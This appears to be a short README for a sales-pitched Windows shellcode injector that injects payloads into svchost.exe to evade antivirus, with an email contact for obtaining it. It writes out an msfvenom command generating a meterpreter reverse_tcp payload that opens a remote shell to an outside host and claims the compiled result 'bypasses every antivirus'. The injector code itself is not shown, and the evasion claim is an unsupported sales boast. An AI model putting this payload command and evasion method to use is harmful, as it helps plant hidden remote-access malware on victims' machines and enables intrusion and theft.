# Shellcode-Injector
Injects Shellcode in Process (even metersploit payloads fud)


FUD x64 Shellcode injector which injects the shellcode to svchost.exe and makes even a meterpreter fud.

Example:

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=... LPORT=... -f python 

You put the Shellcode in the script and compile it to a exe, if this script gets executed it bypasses every antivirus and gives you a normal meterpreter shell.

Get it: Blackclone24@proton.me
